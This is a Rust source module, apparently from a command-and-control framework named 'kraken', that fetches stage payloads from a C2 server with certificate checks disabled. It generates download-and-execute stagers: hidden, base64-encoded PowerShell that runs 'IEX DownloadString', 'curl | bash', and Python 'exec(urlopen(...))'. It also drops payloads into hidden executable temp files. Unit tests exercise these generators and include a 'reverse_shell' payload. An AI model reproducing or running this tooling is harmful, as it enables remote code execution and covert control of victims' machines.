use base64::Engine;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct StagerConfig {
    pub stage_url: String,
    pub stage_key: String,
    pub verify_checksum: bool,
}

impl Default for StagerConfig {
    fn default() -> Self {
        StagerConfig {
            stage_url: "https://c2.kraken.local/stage".to_string(),
            stage_key: "changeme".to_string(),
            verify_checksum: true,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct StagedPayload {
    pub name: String,
    pub data: Vec<u8>,
    pub checksum: String,
    pub entry_point: Option<String>,
    pub arch: String,
    pub platform: String,
    pub encrypted: bool,
}

pub enum PayloadType {
    Shellcode,
    Executable,
    PowerShell,
    Python,
    Bash,
    Script(String),
}

pub struct PayloadStager;

impl Default for PayloadStager {
    fn default() -> Self {
        Self::new()
    }
}

impl PayloadStager {
    pub fn new() -> Self {
        PayloadStager
    }

    pub async fn fetch_stage(&self, config: &StagerConfig) -> Result<StagedPayload, crate::C2Error> {
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| crate::C2Error::Transport(format!("client build failed: {}", e)))?;

        let resp = client
            .get(&config.stage_url)
            .header("X-Stage-Key", &config.stage_key)
            .send()
            .await
            .map_err(|e| crate::C2Error::Transport(format!("stage fetch failed: {}", e)))?;

        let payload: StagedPayload = resp
            .json()
            .await
            .map_err(|e| crate::C2Error::Transport(format!("stage parse failed: {}", e)))?;

        if config.verify_checksum {
            let computed = sha256(&payload.data);
            if computed != payload.checksum {
                return Err(crate::C2Error::Protocol(format!("Checksum mismatch: got {}, expected {}", computed, payload.checksum)));
            }
        }

        Ok(payload)
    }

    pub fn generate_shellcode_stager(callback_url: &str) -> Vec<u8> {
        let mut stager = Vec::new();
        stager.extend_from_slice(b"KRAKEN_STAGE");
        stager.extend_from_slice(callback_url.as_bytes());
        stager
    }

    pub fn generate_powershell_stager(callback_url: &str, encoded: bool) -> String {
        let script = format!(
            "$wc=New-Object Net.WebClient;IEX $wc.DownloadString('{}')",
            callback_url
        );
        if encoded {
            let bytes = base64::engine::general_purpose::STANDARD.encode(script.as_bytes());
            format!("powershell -NoP -NonI -W Hidden -Enc {}", bytes)
        } else {
            format!("powershell -NoP -NonI -W Hidden -C \"{}\"", script)
        }
    }

    pub fn generate_bash_stager(callback_url: &str) -> String {
        format!("curl -s {} | bash", callback_url)
    }

    pub fn generate_python_stager(callback_url: &str) -> String {
        format!("python3 -c \"import urllib.request;exec(urllib.request.urlopen('{}').read())\"", callback_url)
    }

    pub fn execute_in_memory(payload: &StagedPayload) -> Result<String, crate::C2Error> {
        match payload.platform.as_str() {
            "linux" => {
                let tmp = format!("/tmp/.kraken_{}", uuid::Uuid::new_v4());
                std::fs::write(&tmp, &payload.data)
                    .map_err(|e| crate::C2Error::Io(e))?;
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o755))
                        .map_err(|e| crate::C2Error::Io(e))?;
                }
                Ok(format!("Payload written to {}", tmp))
            }
            "windows" => {
                let tmp = format!("C:\\Windows\\Temp\\kraken_{}.exe", uuid::Uuid::new_v4());
                std::fs::write(&tmp, &payload.data)
                    .map_err(|e| crate::C2Error::Io(e))?;
                Ok(format!("Payload written to {}", tmp))
            }
            _ => Err(crate::C2Error::Protocol(format!("Unsupported platform: {}", payload.platform))),
        }
    }
}

fn sha256(data: &[u8]) -> String {
    use sha2::Digest;
    let mut hasher = sha2::Sha256::new();
    hasher.update(data);
    hex::encode(hasher.finalize())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stager_config_default() {
        let config = StagerConfig::default();
        assert_eq!(config.stage_url, "https://c2.kraken.local/stage");
        assert!(config.verify_checksum);
    }

    #[test]
    fn test_generate_shellcode_stager() {
        let stager = PayloadStager::generate_shellcode_stager("https://c2/beacon");
        assert!(stager.starts_with(b"KRAKEN_STAGE"));
    }

    #[test]
    fn test_generate_powershell_stager() {
        let cmd = PayloadStager::generate_powershell_stager("https://c2/payload.ps1", false);
        assert!(cmd.contains("Net.WebClient"));
        assert!(cmd.contains("c2/payload.ps1"));
    }

    #[test]
    fn test_generate_powershell_encoded() {
        let cmd = PayloadStager::generate_powershell_stager("https://c2/p.ps1", true);
        assert!(cmd.starts_with("powershell"));
        assert!(cmd.contains("-Enc "));
    }

    #[test]
    fn test_generate_bash_stager() {
        let cmd = PayloadStager::generate_bash_stager("https://c2/payload.sh");
        assert_eq!(cmd, "curl -s https://c2/payload.sh | bash");
    }

    #[test]
    fn test_generate_python_stager() {
        let cmd = PayloadStager::generate_python_stager("https://c2/payload.py");
        assert!(cmd.contains("urllib.request"));
    }

    #[test]
    fn test_sha256() {
        let hash = sha256(b"hello");
        assert_eq!(hash.len(), 64);
    }

    #[test]
    fn test_staged_payload_serialization() {
        let payload = StagedPayload {
            name: "reverse_shell".to_string(),
            data: vec![0x90, 0x90, 0x90],
            checksum: "abc123".to_string(),
            entry_point: Some("0x401000".to_string()),
            arch: "x86_64".to_string(),
            platform: "linux".to_string(),
            encrypted: false,
        };
        let json = serde_json::to_string_pretty(&payload).unwrap();
        assert!(json.contains("x86_64"));
    }

    #[test]
    fn test_execute_in_memory_linux() {
        let payload = StagedPayload {
            name: "test".to_string(),
            data: vec![0x00],
            checksum: "x".to_string(),
            entry_point: None,
            arch: "x86_64".to_string(),
            platform: "linux".to_string(),
            encrypted: false,
        };
        let result = PayloadStager::execute_in_memory(&payload);
        assert!(result.is_ok());
        let path = result.unwrap();
        assert!(path.contains("/tmp/.kraken_"));
        std::fs::remove_file(path.split_whitespace().last().unwrap()).ok();
    }

    #[test]
    fn test_execute_in_memory_unsupported() {
        let payload = StagedPayload {
            name: "test".to_string(),
            data: vec![],
            checksum: "x".to_string(),
            entry_point: None,
            arch: "arm".to_string(),
            platform: "android".to_string(),
            encrypted: false,
        };
        let result = PayloadStager::execute_in_memory(&payload);
        assert!(result.is_err());
    }
}
